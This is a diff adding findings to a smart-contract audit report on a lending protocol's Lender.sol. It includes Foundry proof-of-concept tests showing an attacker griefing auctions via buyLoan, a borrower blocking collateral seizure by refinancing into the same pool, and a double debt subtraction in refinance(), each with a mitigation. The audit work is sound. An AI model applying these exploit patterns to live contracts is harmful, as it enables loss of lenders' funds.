@@ -323,9 +323,170 @@ Add the below line to the code:
 
 **Proof Of Code:**
 
+Add these to functions to `Lender.sol`:
+
+```solidity
+// added for audit contest proof of concept
+function getPoolBalance(bytes32 poolId) external view returns(uint256 poolBalance) {
+	return pools[poolId].poolBalance;
+}
+// added for audit contest proof of concept
+function getPoolOutstandingLoans(bytes32 poolId) external view returns(uint256 outstandingLoans) {
+	return pools[poolId].outstandingLoans;
+}
+```
+
+Then add the test to `test/Lender.t.sol`:
+
+```solidity
+function test_attackerGriefBuyLoanToSellingPool() public {
+	// using modified setup from test_buyLoan()
+	test_borrow();
+	// accrue interest
+	vm.warp(block.timestamp + 364 days + 12 hours);
+
+	// find the poolId which will auction the loan
+	bytes32 poolId = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
+
+	// record the pool's balance & outstanding loans before the auction & exploit
+	uint256 poolBalanceBefore = lender.getPoolBalance(poolId);
+	uint256 poolOustandingLoansBefore = lender.getPoolOutstandingLoans(poolId);
+
+	// kick off auction
+	vm.startPrank(lender1);
+
+	uint256[] memory loanIds = new uint256[](1);
+	loanIds[0] = 0;
+
+	lender.startAuction(loanIds);
+
+	// warp to middle of auction
+	vm.warp(block.timestamp + 12 hours);
+
+	// stop lender1 prank
+	vm.stopPrank();
+
+	// attacker is not a lender & has no pool but can
+	// call Lender.buyLoan() to force selling pool to buy their own loan
+	// this will grief the auction as the attacker can always stop an auction
+	// by forcing the selling pool to buy back its own loan
+	address attacker = address(0x1337);
+	vm.prank(attacker);
+	lender.buyLoan(loanIds[0], poolId);
+
+	// record the pool's balance & outstanding loans after the exploit
+	uint256 poolBalanceAfter = lender.getPoolBalance(poolId);
+	uint256 poolOustandingLoansAfter = lender.getPoolOutstandingLoans(poolId);
+
+	console.log("poolBalanceBefore         : ", poolBalanceBefore);
+	console.log("poolBalanceAfter          : ", poolBalanceAfter);
+	console.log("poolOustandingLoansBefore : ", poolOustandingLoansBefore);
+	console.log("poolOustandingLoansAfter  : ", poolOustandingLoansAfter);
+
+	// this attack negatively impacts the pool's balance & oustanding loans:
+	// pool balance is reduced after the attack
+	assert(poolBalanceAfter < poolBalanceBefore);
+	// pool outstanding loan is increased after the attack 
+	assert(poolOustandingLoansAfter > poolOustandingLoansBefore);
+}
+```
+
 **Recommended Mitigations:**
 
-### [H-7] 
+Lender.buyLoan() must check poolId parameter does not match the selling poolId.
+
+### [H-7] Allowing the borrower to maintain control of their collateral indefinitely without resolving the debt.
+
+**Description:** The identified issue is that the borrower can grief an auction by repeatedly refinancing their `loan within the same pool`, resetting the loan's auction timeline and preventing their collateral from being seized.
+
+The function allows refinnacing to the same pool, never checks that the loan being refinnaced currently is auctioned or not and resets `loan.auctionStartTimestamp` effectively cancelling any auction.
+
+```solidity
+loans[loanId].auctionStartTimestamp = type(uint256).max;
+loans[loanId].auctionLength = pool.auctionLength;
+```
+By refinancing back into the same pool, these parameters are reset, effectively stopping any ongoing liquidation auction.
+
+**Proof Of Code:**
+
+```solidity
+function test_borrowerGriefAuctionViaRefinance() public{
+    test_borrow();
+
+    // accrue interest
+	vm.warp(block.timestamp + 364 days + 12 hours);
+
+	// find the poolId which will auction the loan
+	bytes32 poolId = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
+
+	// kick off auction
+	vm.startPrank(lender1);
+
+    uint256[] memory loanIds = new uint256[](1);
+	loanIds[0] = 0;
+
+	lender.startAuction(loanIds);
+	vm.stopPrank();
+
+	// attacker is the borrower who wants to prevent their
+	// loan from being auctioned, can stop the auction by
+	// refinancing back into the same pool. They can do this
+	// as soon as the auction is launched to prevent their
+	// collateral from ever being seized
+	vm.startPrank(borrower);
+
+    // prepare the payload
+	Refinance memory r = Refinance({
+		loanId: 0,
+		poolId: poolId,
+		debt: 100*10**18,
+		collateral: 100*10**18
+	});
+	Refinance[] memory rs = new Refinance[](1);
+	rs[0] = r;
+
+	lender.refinance(rs);
+    vm.stopPrank();
+    // verify that a buyer can't buy the auctioned loan
+	address buyer = address(0x1234);
+	vm.prank(buyer);
+	vm.expectRevert();
+	// will revert AuctionNotStarted
+	lender.buyLoan(loanIds[0], poolId);
+
+}
+```
+
+**Impact:** A hostile borrower who never intends on repaying their loan can use this exploit to prevent their collateral from ever being seized, since the only way to seize collateral is to run an auction & have that auction finish without any buyers. This results in a lender never being able to collect payment or seize the collateral; the borrower can maintain the loan indefinitely by using this exploit to immediately stop any auction of their loan.
+
+**Recommended Mitigations:** Implement checks to find out that loan that is being auctioned cannot be refinnaced at the same time.
+
+### [H-8] Debt is substracted twice from the pool
+
+**Description:** The `refinance` function allows borrowers to move there loan to another pool under new lending conditions. The issue arises because the new pool's poolBalance is reduced twice during the refinance() function.
+
+In refinance() the debt to the new pool is transferred at line 636:
+
+```solidity
+	_updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
+```
+
+The debt is subtracted again at line 696:
+
+```solidity
+     	pools[poolId].poolBalance -= debt;
+```
+
+**Impact:** Pool balances are reduced twice by the transferred debt. The larger the loan the greater the loss of funds to the new pool.
+
+**Recommended Mitigations:** 
+
+Only implement the line:
+
+```solidity
+     	pools[poolId].poolBalance -= debt;
+```
+
 
 # Medium 
 
